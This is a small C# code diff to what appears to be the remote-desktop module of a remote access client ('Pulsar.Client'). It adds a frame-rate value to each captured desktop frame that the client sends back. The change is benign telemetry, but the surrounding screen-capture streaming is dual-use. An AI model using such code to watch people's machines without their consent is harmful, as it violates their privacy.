@@ -88,9 +88,10 @@ namespace Pulsar.Client.Messages
         private int _pendingFrameRequests = 0;
 
         private const int MAX_BUFFER_SIZE = 10;
-
+        
         private readonly Stopwatch _stopwatch = new Stopwatch();
         private int _frameCount = 0;
+        private float _lastFrameRate = 0f;
 
         // drawing commands
         private readonly ConcurrentQueue<Action> _drawingQueue = new ConcurrentQueue<Action>();
@@ -328,6 +329,7 @@ namespace Pulsar.Client.Messages
                         if (_stopwatch.ElapsedMilliseconds >= 1000)
                         {
                             Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
+                            _lastFrameRate = _frameCount;
                             _frameCount = 0;
                             _stopwatch.Restart();
                         }
@@ -401,15 +403,18 @@ namespace Pulsar.Client.Messages
 
             try
             {
-                _clientMain.Send(new GetDesktopResponse
+                var response = new GetDesktopResponse
                 {
                     Image = frameData,
                     Quality = _streamCodec.ImageQuality,
                     Monitor = _streamCodec.Monitor,
                     Resolution = _streamCodec.Resolution,
                     Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
-                    IsLastRequestedFrame = isLastRequestedFrame
-                });
+                    IsLastRequestedFrame = isLastRequestedFrame,
+                    FrameRate = _lastFrameRate
+                };
+
+                _clientMain.Send(response);
             }
             catch (Exception ex)
             {
